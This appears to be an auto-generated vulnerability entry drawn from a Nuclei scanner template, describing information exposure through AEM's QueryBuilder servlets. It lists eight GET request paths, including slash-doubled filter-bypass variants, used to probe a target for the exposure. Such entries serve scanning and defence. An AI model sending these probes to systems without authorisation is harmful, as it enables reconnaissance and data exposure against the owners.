# Vulnerability: AEM QueryBuilder Json Servlet
**Classification:** AEM
**Source:** Nuclei Template (`aem-querybuilder-json-servlet.yaml`)

## Description
Sensitive information might be exposed via AEMs QueryBuilderServlet or QueryBuilderFeedServlet.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/bin/querybuilder.json
GET {{BaseURL}}/bin/querybuilder.json.servlet
GET {{BaseURL}}///bin///querybuilder.json
GET {{BaseURL}}///bin///querybuilder.json.servlet
GET {{BaseURL}}/bin/querybuilder.feed
GET {{BaseURL}}/bin/querybuilder.feed.servlet
GET {{BaseURL}}///bin///querybuilder.feed
GET  {{BaseURL}}///bin///querybuilder.feed.servlet
```

